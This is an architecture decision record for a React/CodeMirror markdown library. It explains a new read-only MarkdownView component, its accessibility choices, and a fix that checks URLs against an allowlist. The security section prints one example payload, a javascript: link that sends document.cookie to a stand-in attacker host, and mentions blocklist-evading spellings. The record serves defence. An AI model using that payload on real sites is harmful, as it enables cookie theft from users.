# The read-only markdown view is its own component, in the CodeMirror subpath

**Status:** Accepted
**Date:** 2026-08-24
**Type:** Component / API shape / Security
**Supersedes:** —
**Superseded by:** —
**Extends:** [2026-08-21-the-codemirror-live-preview-subpath-is-built.md](2026-08-21-the-codemirror-live-preview-subpath-is-built.md)

## Decision

`MarkdownView` is a component of its own, exported from
`@charcuterie/ui/markdown-editor-codemirror` beside `MarkdownEditorCodeMirror`. It renders
markdown and has **no code path that can render a toolbar**.

Four shape decisions come with it:

1. **It is a component, not a prop on the editors.** `isReadOnly` keeps its meaning — an
   editor you cannot type in — and `hasToolbar` was refused.
2. **It is in the CodeMirror subpath**, not a dependency-free reader in the main barrel.
3. **It is controlled** (`value`), where both editors are uncontrolled (`defaultValue`).
4. **A `- [ ]` checkbox is inert unless the consumer passes `onToggleTask`.**

And one fix that is not about the view at all: **a URL from the document is checked before
it is used as a URL**, in the editors as well.

## Context

Docket needs a rendered read-only markdown surface in three places — a comment, a repo file
fetched at a commit hash, and the reading half of its task screen — and the library had
none. `isReadOnly` on either editor disables the nine formatting buttons and still paints
them, so Docket was working around the library with a CSS rule in its own stylesheet, keyed
on `role="toolbar"` and using `display: none` so nothing stayed in the tab order. That
workaround is labelled as one in three places in that repo.

A CSS rule is a poor place to keep this promise, and each of the obvious spellings fails
differently: `visibility: hidden` leaves the buttons in the accessibility tree, `opacity: 0`
leaves them in the tab order, and `display: none` still leaves the **overflow menu button**
the toolbar collapses into at narrow widths. None of them is greppable from this repo, and
none of them survives an app that forgets to copy the rule.

## Why

### Why a component and not a prop

The library's neighbours split by shape rather than by flag: `Listbox`, `Combobox` and
`Picker` are three components rather than three modes of one; `ButtonLink` is a sibling of
`Button`; `BadgeButton` is a sibling of `Badge`, decided the same way two days ago.

A `hasToolbar={false}` on `MarkdownEditorCodeMirror` would leave `onUploadImage`, `icons`,
`placeholder`, `rawModeLabel` and `defaultValue` on the type, none of which mean anything to
a reader — and "no toolbar" would be a **branch that can be got wrong** rather than a thing
that does not exist. The test for the absence is then a test of a conditional; here it is a
test of the component.

### Why the CodeMirror subpath, and not a light reader in the barrel

This is the decision that cost the most thought, because the cheap version is genuinely
tempting: a `react-markdown` reader in `@charcuterie/ui` proper, no CodeMirror, a few
kilobytes, importable by every app in the fleet.

It was refused because the requirement is that the view renders **the same** as the editor
the same document is edited in, and a second renderer only satisfies that on the day it is
written. Two parsers, two table implementations, two answers to what a bare URL does and to
whether a `\|` conceals its backslash — they agree at first and drift one construct at a
time. The bug arrives months later as *"the table changed when I saved it"*, and it is
nobody's commit.

`MarkdownView` shares `livePreviewRanges.ts` — the 1,200 pure lines that decide what every
construct looks like — and the CodeMirror theme, with `MarkdownEditorCodeMirror`. The two
agree because they are the same code. That is the same *mechanical, not policed* reasoning
that made the editor a decoration layer over markdown text instead of a document model with
a serialiser.

The cost is real and is stated rather than hidden: a consumer who wants only the reader
still installs CodeMirror. For an app that renders markdown in three places and edits it in
one, that is the right way round — the dependency is paid once, and the subpath already
exists so no app that does not import it pays anything.

**One subpath, not two.** A `./markdown-view-codemirror` entry point would suggest a second,
separable dependency where there is one, and would give the shared `livePreview` module two
ways into a consumer's bundle.

### Why controlled, when the editors are not

The editors take `defaultValue` because reassigning an `EditorView`'s document from outside
throws away the undo history that belonged to it — a real cost, and why they ask for a `key`
instead. A view has no undo history and no caret, so it has nothing to lose by rendering
what it is given. Docket fetching a file at a different commit hash should be a prop change,
not a remount, and the `key` requirement is exactly the trap the editor's own record
documents biting a consumer.

### Why the checkbox is inert by default

The question is genuinely open, so it is answered per surface rather than globally.

Two of Docket's three surfaces — a rendered comment, and a file fetched at a commit hash —
have **nowhere to put a tick**. A box that visibly toggles and loses the change on reload is
worse than one that says up front it cannot, and the state itself is a fact about the
document that belongs on screen either way. So the default is a `disabled` checkbox: still
checked or unchecked, and announced as unavailable.

Passing `onToggleTask` brings it back to life. This is the same shape `onUploadImage` uses
on both editors — *omit the handler and the capability is simply not offered* — which is a
pattern this package already relies on rather than a new one invented here. The handler
receives the **whole next markdown document**, matching the editors' `onChange`, so one
autosave wires to all three components.

### Why `role="article"` and real anchors

CodeMirror writes `role="textbox"` on its content. For an editor that is correct. For a
reader it is a trap: a screen reader entering a textbox switches to forms mode and reads the
contents as one flat string, with no heading and no table navigation — which deletes most of
the reason the markdown was rendered.

So the view overrides the role to `article`, and then has to make the structure real:

- ATX headings carry `role="heading"` and an `aria-level` on their line decoration. The
  editor deliberately does **not** get this — ARIA flattens a textbox's contents, so a
  heading role inside one would be a decoration that lies about what it does.
- Links become real `<a href>` elements through `Decoration.mark`'s `tagName`. The editor
  cannot: an anchor inside a `contenteditable` competes with the caret for its line, which
  is why it paints a span and translates a `mousedown` instead, and why clicking link text
  *there* cannot place a caret. A document has no caret, so the link is simply a link.
- A wide table's scroll box gets `tabindex="0"`. The editor got that free from being
  editable; axe caught the view losing it, and it is WCAG 2.1.1.

Two smaller findings the gate produced, both kept as written rather than suppressed.
`EditorState.readOnly` is **not** set: it makes CodeMirror write `aria-readonly="true"`,
which ARIA does not define for `article`, and nothing here needs it because no keymap and no
input handler is installed for it to guard. `EditorView.editable.of(false)` is the whole of
what the surface needs. And `aria-multiline` **cannot be unset** — CodeMirror's `updateAttrs`
calls `setAttribute` with whatever it is handed, so `undefined` arrives as the string
`"undefined"` — so it is set to `"false"`, which is both the true answer and the value axe
ignores on an element carrying `contenteditable`.

### The security fix, which was not about the view

The view is what forced the question, because it renders files fetched from a git host. Most
of the usual answer was already structural and needed nothing: there is no `innerHTML` in
this subpath, no `dangerouslySetInnerHTML` and no sanitiser to have a bug in, CodeMirror's
state holds the source as *text*, and every widget is built with `createElement` and
`textContent`. A `<script>` in a fetched README was already drawn as the characters
`<script>`, and still is — not stripped, not escaped, because there is no code path that
would turn it into an element.

One thing was not covered, and it was **live in the editors**: a URL was taken from the
document and used as a URL with no check at all.

```md
[click me](javascript:fetch("https://attacker.invalid/"+document.cookie))
```

concealed its markup, painted as a link, and `window.open` ran it in this origin.

So every URL now crosses `safeUrls.ts` before it reaches an `href`, an `src` or
`window.open`, in all three components. It is a defect in a shape they share, which makes it
a defect in the layer they share.

**An allowlist, not a blocklist**, because denying `javascript:` is the version that has a
bug: browsers throw tabs and newlines away before they read a scheme, so `JaVaScript:`, a
tab in the middle of the word and a leading newline are one URL to a navigation and three
different strings to a blocklist. The module normalises the way a browser does and then asks
what scheme is left — no scheme at all is a relative URL and is always fine. Links take
`http`, `https`, `mailto` and `tel`; images take `http`, `https` and `data:image/*`, where
the `data:` case is safe precisely because an `<img>` is a replaced element with no script
execution and no reach into the page.

**A rejected link is left as source.** The whole `[click me](javascript:…)` construct keeps
its brackets and parentheses rather than being repainted as a link-coloured word that
silently refuses to work — a reader who can see the trap is better served than one shown a
confident blue word.

Remote images also gain `referrerpolicy="no-referrer"`, so an image in somebody else's file
cannot learn which page loaded it.

## Evidence

- `MarkdownView.test.tsx`, seven tests in the same chromium the stories render in.
  `queryAllByRole("toolbar")`, `("button")` and `("menu")` are each empty; the article's
  headings resolve by `getByRole("heading", { name })` with the right `aria-level`; the
  link is an `<a>` with `rel="noopener noreferrer"` and Tab from the button above it lands
  on the anchor rather than on the document; a disabled box and a tickable box round-trip
  through the markdown; the hostile fixture yields exactly one `href`, no `script` element,
  no `img[src]`, and the literal text `[Looks like a link](javascript:`.
- The `SameAsTheEditor` story hands one string to both surfaces and the test compares the
  rendered `<th>`/`<td>` text of the two tables, the six checkboxes, and the two autolinks.
- `safeUrls.test.ts`, six node tests, including the three whitespace spellings of
  `javascript:` a blocklist would miss.
- Every gate: `lint:biome`, `lint:eslint`, `typecheck`, 1,463 vitest tests,
  `check:contrast` (452 pairs, 0 failing), `build:storybook`, and `smoke:storybook`
  (369 entries clean).
- **VRT, captured on this branch and on `origin/master` in the same sandbox and compared by
  file hash.** 12 new shots, the six `MarkdownView` stories in both schemes; **zero existing
  baselines changed**. The first pass reported one changed shot,
  `components-actions-menu--all-variants__light` — a second capture of *`origin/master`
  alone* produced the branch's hash, so that story is flaky and the difference was not this
  change. Worth writing down: a single VRT capture of a baseline is not evidence.
